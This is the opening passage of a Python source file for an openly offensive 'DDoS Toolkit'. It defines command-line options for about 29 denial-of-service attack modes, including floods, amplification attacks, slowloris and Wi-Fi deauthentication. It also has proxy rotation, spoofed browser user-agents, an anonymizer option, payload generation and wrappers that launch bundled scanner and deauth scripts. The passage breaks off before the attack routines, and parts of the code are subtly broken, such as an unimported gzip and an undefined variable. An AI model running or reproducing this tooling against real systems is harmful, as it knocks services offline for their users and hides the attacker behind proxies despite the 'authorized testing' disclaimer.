#!/usr/bin/env python3
# -*- coding: utf-8 -*-
### BEGIN INIT INFO
# Provides:          ddos_toolkit
# Required-Start:    $network $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: DDoS Toolkit
# Description:       Comprehensive toolkit for simulating various DDoS attacks for ethical cybersecurity testing, penetration testing, and network resilience evaluation. Includes 20+ attack vectors, proxy support, performance monitoring, and detailed reporting.
# Author:            
# + LIONMAD <https://github.com/Midohajhouj>
# Version:           v.1.0
# License:           MIT License - https://opensource.org/licenses/MIT
# Dependencies:      python3 (>=3.7), aiohttp, scapy, dnspython, colorama, tqdm, psutil.
# Support:           https://github.com/Midohajhouj/DDoS-Toolkit/issues
# Security:          Requires root privileges for certain attacks
# Disclaimer:        For authorized testing only. Use responsibly.
#### END INIT INFO ####

import sys # Install module with pip sys --break-system-packages
import importlib # Install module with pip importlib --break-system-packages

def check_library(lib_name):
    """Checks if a library is installed and prompts to install it if not."""
    try:
        importlib.import_module(lib_name)
    except ImportError:
        print(f"{lib_name} is not installed.")
        print(f"Install it using: pip install {lib_name} --break-system-packages")
        sys.exit(1)
        
# ================== Third-Party Libraries ==================
# Check for third-party libraries.
required_libraries = [
    "aiohttp", "asyncio", "argparse", "scapy.all", "dns.resolver",
    "colorama", "tqdm", "requests", "tabulate"
]

for lib in required_libraries:
    # Handle libraries with dot notation like 'scapy.all'
    check_library(lib.split(".")[0])

# Libraries are now guaranteed to be installed. Import them.
import aiohttp  # Install module with pip aiohttp --break-system-packages
import asyncio  # Install module with pip asyncio --break-system-packages
import time  # Install module with pip time --break-system-packages
import argparse  # Install module with pip argparse --break-system-packages
import threading  # Install module with pip threading --break-system-packages
from concurrent.futures import ThreadPoolExecutor, as_completed  # Install module with pip concurrent.futures --break-system-packages
import random  # Install module with pip random --break-system-packages
import json  # Install module with pip json --break-system-packages
from itertools import cycle  # Install module with pip itertools --break-system-packages
from collections import deque  # Install module with pip collections --break-system-packages
from uuid import uuid4  # Install module with pip uuid --break-system-packages
from base64 import b64encode  # Install module with pip base64 --break-system-packages
import hashlib  # Install module with pip hashlib --break-system-packages
import zlib  # Install module with pip zlib --break-system-packages
import hmac  # Install module with pip hmac --break-system-packages
import signal  # Install module with pip signal --break-system-packages
import sys  # Install module with pip sys --break-system-packages
import os  # Install module with pip os --break-system-packages
import subprocess  # Install module with pip subprocess --break-system-packages
import socket  # Install module with pip socket --break-system-packages
import struct  # Install module with pip struct --break-system-packages
import logging  # Install module with pip logging --break-system-packages
import psutil  # Install module with pip psutil --break-system-packages
import shutil  # Install module with pip shutil --break-system-packages
import scapy.all as scapy  # Install module with pip scapy --break-system-packages
import dns.resolver  # Install module with pip dnspython --break-system-packages
from colorama import init, Fore, Style  # Install module with pip colorama --break-system-packages
from tqdm import tqdm  # Install module with pip tqdm --break-system-packages
from typing import Optional # Install module with pip typing --break-system-packages

# Initialize colorama for colorized terminal output
init(autoreset=True)
# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)
stop_event = threading.Event()

# User-Agent list
# Comprehensive User-Agent list with device information
USER_AGENTS = [
    # Windows 10/11 PCs - Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    # Windows 10/11 PCs - Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edge/94.0.992.31",
    # macOS Devices - Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    # Linux PCs - Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    # Android Devices - Chrome
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    # iOS Devices - Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    # Legacy Windows - Firefox
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
    # Legacy Android - Chrome
    "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.2.2; Nexus 4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.159 Mobile Safari/537.36",
    # Internet Explorer
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; AS-KDG) like Gecko",
    # Smart TVs and Game Consoles
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/69.0.3497.106 TV Safari/537.36",
    "Mozilla/5.0 (PlayStation 4 8.52) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    # Bots and Crawlers
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

# Supported HTTP methods
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]

# Configure logging
logging.basicConfig(
    level=logging.INFO,  # Logging level
    format='%(asctime)s - %(levelname)s - %(message)s',  # Log format
    handlers=[logging.StreamHandler()]  # Output to console
)
logger = logging.getLogger(__name__)  # Module-level logger

def display_banner():
    print(f"""
{BLUE}
███████████████████████████████████████████████████████████████████████████████████████████████████                                     
 ▄▄▄▄▄    ▄▄▄▄▄      ▄▄▄▄     ▄▄▄▄     ▄▄▄▄▄▄▄▄   ▄▄▄▄     ▄▄▄▄   ▄▄      ▄▄   ▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄         
 ██▀▀▀██  ██▀▀▀██   ██▀▀██  ▄█▀▀▀▀█    ▀▀▀██▀▀▀  ██▀▀██   ██▀▀██  ██      ██  ██▀  ▀▀██▀▀ ▀▀▀██▀▀▀ 
 ██    ██ ██    ██ ██    ██ ██▄           ██    ██    ██ ██    ██ ██      ██▄██      ██      ██    
 ██    ██ ██    ██ ██    ██  ▀████▄       ██    ██    ██ ██    ██ ██      █████      ██      ██    
 ██    ██ ██    ██ ██    ██      ▀██      ██    ██    ██ ██    ██ ██      ██  ██▄    ██      ██    
 ██▄▄▄██  ██▄▄▄██   ██▄▄██  █▄▄▄▄▄█▀      ██     ██▄▄██   ██▄▄██  ██▄▄▄▄▄ ██   ██▄ ▄▄██▄▄    ██         
 ▀▀▀▀▀    ▀▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀        ▀▀      ▀▀▀▀     ▀▀▀▀   ▀▀▀▀▀▀▀ ▀▀    ▀▀ ▀▀▀▀▀▀    ▀▀    
|U|S|E| |T|H|E| |T|O|O|L|  |A|T| |Y|O|U|R| |O|W|N| |R|I|S|K|  |L|I|O|N|M|A|D|  |S|A|L|U|T|  |Y|O|U|                                                                                        
███████████████████████████████████████████████████████████████████████████████████████████████████
{RESET}
""")

def display_help():
    print(f"""
{YELLOW}╔═════════════════════════════════════════════════════════════╗
{YELLOW}║ {BLUE}DDoS Toolkit by LIONMAD   -   Comprehensive help information{YELLOW}║
{YELLOW}╚═════════════════════════════════════════════════════════════╝
{RESET}
{CYAN}For more info, visit our website: https://ddostoolkit.vercel.app/{RESET}
{BLUE}Usage: ddos [OPTIONS]{RESET}
  {GREEN}-u, --url URL{RESET}              Target URL or IP address (required for most attacks)
  {GREEN}-a, --attack-mode MODE{RESET}     Type of attack to perform (see below)
  {GREEN}-t, --threads NUM{RESET}          Number of threads/workers (default: 10)
  {GREEN}-d, --duration SEC{RESET}         Attack duration in seconds (default: 60)
  {GREEN}-r, --rate-limit RPS{RESET}       Rate limit per thread (default: 100)
  {GREEN}-p, --pause SEC{RESET}            Delay between requests (default: 0.1)
  {GREEN}--proxies FILE{RESET}             File containing proxy list (one per line)
  {GREEN}--results FILE{RESET}             Save attack results to JSON file
  {GREEN}-v, --version{RESET}              Show version information and exit FILE
  {GREEN}-s, --scan{RESET}                 Perform network scan before attack
  {GREEN}--anonymizer [start|stop]{RESET}  Enable/disable anonymizer for attack
  {GREEN}--wifi-deauth{RESET}              Perform Wi-Fi deauthentication attack
  {GREEN}-i, --interactive{RESET}          Start interactive command-line interface

{YELLOW}Attack Modes:{RESET}
  {CYAN}http-flood{RESET}               {CYAN}slowloris{RESET}
  {CYAN}udp-flood{RESET}                {CYAN}syn-flood{RESET} 
  {CYAN}icmp-flood{RESET}               {CYAN}dns-amplification{RESET} 
  {CYAN}ntp-amplification{RESET}        {CYAN}memcached-amplification{RESET}
  {CYAN}smurf{RESET}                    {CYAN}teardrop{RESET} 
  {CYAN}http2-flood{RESET}              {CYAN}goldeneye{RESET}             
  {CYAN}slow-read{RESET}                {CYAN}zero-byte{RESET}              
  {CYAN}random-packets{RESET}           {CYAN}ssl-flood{RESET}              
  {CYAN}land-attack{RESET}              {CYAN}ping-of-death{RESET}          
  {CYAN}slow-post{RESET}                {CYAN}xml-bomb{RESET}              
  {CYAN}ntlm-auth-flood{RESET}          {CYAN}char-gen{RESET}                
  {CYAN}rst-flood{RESET}                {CYAN}ack-flood{RESET}             
  {CYAN}http-fragmentation{RESET}       {CYAN}ws-dos{RESET}                 
  {CYAN}quic-flood{RESET}               {CYAN}slow-flood{RESET}             
  {CYAN}ftp-flood{RESET}                {CYAN}ssh-flood{RESET}
  
  {YELLOW}Warning:{RESET} {RED}This tool should only be used for authorized security testing.{RESET}
""")

def parse_args():
    parser = argparse.ArgumentParser(
        description=f"{YELLOW}DDoS Toolkit v.1.0{RESET}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )
    
    # Core attack options
    core_group = parser.add_argument_group(f"{CYAN}Core Options{RESET}")
    core_group.add_argument("-u", "--url", help="Target URL or IP address")
    core_group.add_argument("-a", "--attack-mode", 
                          choices=["http-flood", "slowloris", "udp-flood", "syn-flood", 
                                  "icmp-flood", "dns-amplification", "ftp-flood", 
                                  "ssh-flood", "ntp-amplification", "memcached-amplification", 
                                  "smurf", "teardrop", "http2-flood", "goldeneye", 
                                  "slow-read", "zero-byte", "random-packets", "ssl-flood",
                                  "land-attack", "ping-of-death", "slow-post", "xml-bomb",
                                  "ntlm-auth-flood", "char-gen", "rst-flood", "ack-flood",
                                  "http-fragmentation", "ws-dos", "quic-flood"],
                          default="http-flood",
                          help="Type of attack to perform")
    core_group.add_argument("-t", "--threads", type=int, default=10,
                          help="Number of threads/workers")
    core_group.add_argument("-r", "--rate-limit", type=int, default=100,
                          help="Rate limit per thread (requests per second)")
    core_group.add_argument("-p", "--pause", type=float, default=0.1,
                          help="Pause time between requests")
    core_group.add_argument("-d", "--duration", type=int, default=1500,
                          help="Attack duration in seconds")
    core_group.add_argument("--proxies", help="File containing proxy list")
    core_group.add_argument("--results", help="File to save results (JSON)")

    # Additional features
    feature_group = parser.add_argument_group(f"{MAGENTA}Additional Features{RESET}")
    feature_group.add_argument("-s", "--scan", action="store_true",
                             help="Perform network scan before attack")
    feature_group.add_argument("--wifi-deauth", action="store_true",
                             help="Perform Wi-Fi deauthentication attack")
    feature_group.add_argument("--anonymizer", choices=["start", "stop"],
                             help="Enable/disable anonymizer")
    feature_group.add_argument("-i", "--interactive", action="store_true",
                             help="Start interactive CLI")

    # Information options
    info_group = parser.add_argument_group(f"{GREEN}Information{RESET}")
    info_group.add_argument("-h", "--help", action="store_true",
                          help="Show this help message and exit")
    info_group.add_argument("-v", "--version", action="store_true",
                          help="Show version information and exit")

    return parser.parse_args()

def load_proxies(proxy_file: str):
    """Load proxies from a text file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        print(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        print(f"Proxy file '{proxy_file}' not found.")
        return []

def validate_proxies(proxies):
    """Validate proxy servers using multithreading."""
    validated_proxies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                if future.result():
                    validated_proxies.append(proxy)
            except Exception as e:
                logging.error(f"Proxy validation failed for {proxy}: {e}")
    print(f"Validated {len(validated_proxies)} proxies.")
    return validated_proxies

async def check_proxy(proxy: str):
    """Check if a proxy server is working."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

async def check_proxy_health(proxy: str):
    """Check the health of a proxy server."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

async def monitor_proxy_health(proxies):
    """Continuously monitor proxy health and remove dead proxies."""
    while not stop_event.is_set():
        for proxy in proxies:
            if not await check_proxy_health(proxy):
                proxies.remove(proxy)
                print(f"Removed unhealthy proxy: {proxy}")
        await asyncio.sleep(60)

def generate_payload(payload_type: str, secret_key: Optional[bytes] = None) -> Optional[bytes]:
    """Generate various types of attack payloads."""
    if secret_key is None:
        secret_key = os.getenv("SECRET_KEY", b"your_default_secret_key")
    
    try:
        payload_id = str(uuid4())
        data = b64encode(os.urandom(64)).decode()
        
        payload = {"id": payload_id, "data": data}
        
        payload_str = json.dumps(payload, separators=(',', ':'))
        signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
        payload["signature"] = signature
        
        logger.debug(f"Generated signature: {signature}")

        if payload_type == "json":
            compressed_payload = compress_payload(json.dumps(payload).encode())
        elif payload_type == "xml":
            xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
            compressed_payload = compress_payload(xml_payload.encode(), compression_type="gzip")
        elif payload_type == "form":
            return json.dumps(payload).encode()
        else:
            logger.error(f"Invalid payload type: {payload_type}")
            return None
        
        return compressed_payload
    except Exception as e:
        logger.error(f"Error generating payload: {e}")
        return None

def compress_payload(data: bytes, compression_type: str = "zlib") -> bytes:
    """Compress payload data using specified algorithm."""
    try:
        if compression_type == "gzip":
            compressed_data = gzip.compress(data)
            logger.debug(f"Compressed using gzip: {len(compressed_data)} bytes")
        else:
            compressed_data = zlib.compress(data)
            logger.debug(f"Compressed using zlib: {len(compressed_data)} bytes")
        
        return compressed_data
    except Exception as e:
        logger.error(f"Error compressing data: {e}")
        return data

def wifi_deauth(mode):
    """Perform Wi-Fi deauthentication attack."""
    try:
        wifideauth_path = "/opt/DDoS-Toolkit/assets/wifideauth"
        
        if not os.path.isfile(wifideauth_path):
            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
            return

        if not shutil.which("python3"):
            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
            return

        command = ["python3", wifideauth_path, "wlan0"]

        print(f"{BLUE}[*] Starting network scan on wlan0..{RESET}")
        subprocess.run(command, check=True)

        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")
    except subprocess.CalledProcessError as cpe:
        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
    except FileNotFoundError as fnf:
        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
    except Exception as e:
        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
        
def run_network_scanner(target_ip):
    """Run network scanning tool against target IP."""
    try:
        netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
        
        if not os.path.isfile(netscan_path):
            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
            return

        if not shutil.which("python3"):
            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
            return

        command = ["python3", netscan_